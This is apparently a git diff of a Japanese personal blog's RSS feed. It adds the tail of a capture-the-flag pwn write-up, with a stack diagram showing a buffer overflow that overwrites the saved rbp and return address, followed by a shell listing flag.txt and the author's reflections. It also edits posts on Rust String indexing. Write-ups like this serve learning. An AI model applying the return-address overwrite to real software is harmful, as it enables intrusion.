+0x00007ffcd3c61610 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x4141414141414141 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;|
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007ffcd3c61618 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x4141414141414141 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;|
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007ffcd3c61620 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x4141414141414141 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &amp;lt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; saved rbp (vuln)
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007ffcd3c61628 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x0000000000400862 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &amp;lt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; return address (vuln)
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007ffcd3c61630 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x0000000000400a0a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &amp;lt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; saved rbp (main)
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007ffcd3c61638 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x00007faa73778b97 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &amp;lt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; return address (main)
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007ffcd3c61640 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x0000000000000001 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;|
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007ffcd3c61648 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x00007ffcd3c61718 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;|
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+
+Congratulations!
+ls
+chall
+flag.txt
+redir.sh
+&lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;　flag.txt を&lt;code&gt;cat&lt;&#x2F;code&gt;で見てあげるとフラグが出てきました。&lt;br&gt;　
+　これで一件落着しましたが、「Conglatulations! と出た後にコマンドを打つ」という考え競技中は思い浮かばなかったので、やっぱり自分の力不足だったのかなと思っています。他の pwn の問題も解いて、理解を深めたいところです。&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;gan-xiang&quot;&gt;感想&lt;&#x2F;h2&gt;
+&lt;p&gt;　はじめての ctf はなかなかうまくいかないことが多かったですが、ctf の雰囲気や楽しさなどを知ることができ、とても良い経験になりました。ずっと競プロばかりしていましたが、この機会に ctf にも積極的に参加していきたいなと思います。次はもっとチームに貢献できるよう頑張りたいです。&lt;&#x2F;p&gt;
+</description>
+            </item>
         
             <item>
                 <title>rust の String をよく知らなくてコンテストで爆死したお話</title>
@@ -33,8 +313,7 @@
     　^^^^^^^^^^^^^ `std::string::String` cannot be indexed by `&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;usize&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;`
 &lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;
 &lt;p&gt;ふむふむ、どうやら String の添え字アクセスはできないようですね。
-こうゆうときに限って解決法書いてくれない rustc 本当に嫌いです。&lt;&#x2F;p&gt;
-&lt;p&gt;ということで死に物狂いで調べたので、それをまとめます。&lt;&#x2F;p&gt;
+こうゆうときに限って解決法書いてくれない rustc 本当に嫌いです。どうすればええんや・・・&lt;&#x2F;p&gt;
 &lt;h1 id=&quot;jie-lun&quot;&gt;結論&lt;&#x2F;h1&gt;
 &lt;p&gt;結論から言うと、Vec&lt;char&gt; に変換してあげれば ok です。&lt;&#x2F;p&gt;
 &lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
@@ -44,8 +323,7 @@
     ...
 }
 &lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;
-&lt;p&gt;ただ、C++ でできることが rust でできないことが納得できなかったので調べてみました。&lt;&#x2F;p&gt;
-&lt;h1 id=&quot;dousite&quot;&gt;どうして&lt;&#x2F;h1&gt;
+&lt;p&gt;つらい&lt;&#x2F;p&gt;
 </description>
             </item>
         
@@ -55,7 +333,7 @@
                 <link>https://earlgray283.github.io/public/hello-world/</link>
                 <guid>https://earlgray283.github.io/public/hello-world/</guid>
                 <description>&lt;h1 id=&quot;aisatu&quot;&gt;あいさつ&lt;&#x2F;h1&gt;
-&lt;p&gt;　rust や競プロの備忘録として使えたらなと思います。あと大学の数学もまとめていきたいです(主に latex の練習)。 &lt;strong&gt;対戦よろしくお願いします。&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;　プログラミング関連の備忘録として使えたらなと思います。よろしくおねがいします。&lt;&#x2F;p&gt;
 </description>
             </item>
         
